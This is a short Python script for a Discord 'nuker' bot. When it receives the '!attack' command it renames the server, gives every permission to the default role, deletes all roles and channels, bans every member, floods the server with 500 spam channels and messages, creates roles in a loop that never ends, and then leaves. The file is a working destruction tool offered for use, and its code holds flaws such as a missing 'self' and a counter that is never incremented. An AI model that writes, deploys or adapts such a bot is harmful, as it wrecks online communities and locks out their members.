import discord
from discord.ext import commands
from discord import Permissions
import time
import os
token = os.environ.get('TOKENZ')

class MyClient(discord.Client):
    async def on_message(message):
        a = 0
        c = 0
        server = os.environ.get('SERVER')
        channel = os.environ.get('CHANNEL')
        text = os.environ.get('TEXT')
        if message.content == '!attack' and not message.author.bot:
            await message.delete()
            with open('chaos.jpeg', 'rb') as f:
                icon = f.read()
            await message.guild.edit(name=str(server), icon=icon)
            await message.guild.default_role.edit(permissions=Permissions.all())

            for i in message.guild.roles:
                await i.delete()
            for i in message.guild.members:
                await i.ban(reason='Сервер крашится')
            for i in message.guild.channels:
                await i.delete()

            while c < 500:
                o = await message.guild.create_text_channel(name=str(channel))
                await o.send(str(text))
                c += 1
            c = 0
            while c < 250:
                await message.guild.create_role(name=str(channel), colour=discord.Colour(0x7289DA))
            await message.guild.leave()



client = MyClient()
client.run(str(token))
